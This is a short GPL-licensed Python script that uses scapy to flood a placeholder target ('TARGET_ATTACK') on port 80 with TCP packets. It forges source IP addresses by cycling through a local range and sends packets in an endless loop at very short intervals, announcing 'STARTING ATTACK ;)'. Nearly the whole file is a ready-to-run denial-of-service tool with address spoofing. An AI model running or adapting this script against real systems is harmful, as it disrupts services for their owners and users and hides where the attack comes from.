#############################################################################
#	Copyright (C) 2018  Luciano del Valle	@lucdelcan 						#
#	This program is free software: you can redistribute it and/or modify	#
#	it under the terms of the GNU General Public License as published by    #
#	the Free Software Foundation, either version 3 of the License, or       #
#	(at your option) any later version.                                     #
#	This program is distributed in the hope that it will be useful,			#
#	but WITHOUT ANY WARRANTY; without even the implied warranty of			#
#	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the			#
#	GNU General Public License for more details.                            #
#	You should have received a copy of the GNU General Public Licens		#
#	along with this program.  If not, see <http://www.gnu.org/licenses/>.	#
#############################################################################

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

conf.verb = 0

host = "TARGET_ATTACK"
port = 80

origenIP = "192.168.1."
endIP = 10

packet_number = 0
print('STARTING ATTACK ;)')
while True:
    packet_number += 1
    packet = IP(src= (origenIP+str(endIP)), dst= host) / TCP(sport= RandShort(), dport= port)
    send(packet, inter= 0.0002)
    print("Packet %d sent" %packet_number)
    endIP += 1
    if(endIP == 200):
        endIP = 10
